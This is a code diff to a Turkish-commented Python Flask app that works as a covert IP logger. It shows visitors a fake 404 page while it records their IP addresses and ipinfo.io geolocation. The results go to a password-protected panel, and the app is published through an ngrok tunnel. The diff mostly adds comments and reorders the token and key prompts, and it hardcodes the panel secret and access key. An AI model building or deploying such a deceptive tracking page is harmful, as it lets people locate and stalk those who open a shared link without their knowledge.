@@ -11,6 +11,7 @@ log_kaydi = []
 
 PANEL_SIFRE = "gizlipanel"
 
+# 🌍 Ziyaretçi konumunu alma
 def ip_konum_al(ip):
     try:
         response = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
@@ -33,6 +34,7 @@ def ip_konum_al(ip):
         'lokasyon': 'Bilinmiyor'
     }
 
+# 🌐 Ziyaretçi için sahte 404 sayfası
 @app.route('/')
 def anasayfa():
     ip = request.remote_addr
@@ -43,6 +45,7 @@ def anasayfa():
         <p>The requested URL was not found on the server.</p>
     '''), 404
 
+# 🔒 Panel şifre korumalı
 @app.route('/panel', methods=["GET", "POST"])
 def panel():
     if session.get("giris_yapildi"):
@@ -79,26 +82,28 @@ def giris():
         </form>
     '''
 
+# 🚀 Flask başlatıcı
 def flaski_baslat():
     app.run(port=5000)
 
-def ngrok_baslat():
-    token = input("🔑 NGROK Token girin (boş bırakırsan local çalışır): ").strip()
+# 🌐 Ngrok token ile tünel oluşturucu
+def ngrok_baslat(token):
     if token:
         os.system(f"ngrok config add-authtoken {token}")
         public_url = ngrok.connect(5000)
         print(f"\n🌐 NGROK Adresi: {public_url}")
         print(f"👀 Panel: {public_url}/panel")
-        print(f"🔒 Panel Giriş Sayfası: {public_url}/giris")
+        print(f"🔒 Panel Giriş: {public_url}/giris")
         print(f"🕵️  Ziyaretçiler: {public_url}/")
+        return True
     else:
-        print("\n🌐 Ngrok kullanılmadı. Localhost üzerinden çalışıyor.")
-        print("🔒 Panel Giriş: http://localhost:5000/giris")
+        print("❌ Ngrok token girilmedi, program başlatılmadı.")
+        return False
 
-DOGRU_KEY = "adminpro"
-MAX_DENEME = 5
-
+# 🔐 Key kontrolü
 def key_girisi():
+    DOGRU_KEY = "adminpro"
+    MAX_DENEME = 5
     for hak in range(MAX_DENEME):
         key = getpass("🔐 Ana Key girin (gizli): ")
         if key == DOGRU_KEY:
@@ -109,9 +114,15 @@ def key_girisi():
     print("🚫 Çok fazla yanlış deneme.")
     return False
 
+# 🔄 Ana işlem
 if __name__ == '__main__':
-    if key_girisi():
-        Thread(target=flaski_baslat).start()
-        ngrok_baslat()
+    # Ngrok token önce sorulacak
+    token = input("🔑 NGROK Token girin: ").strip()
+    if ngrok_baslat(token):  # Sadece başarılıysa devam et
+        if key_girisi():     # Key sorulacak
+            Thread(target=flaski_baslat).start()
+        else:
+            print("🔒 Yetkisiz giriş. Sunucu başlatılmadı.")
+            exit()
     else:
         exit()
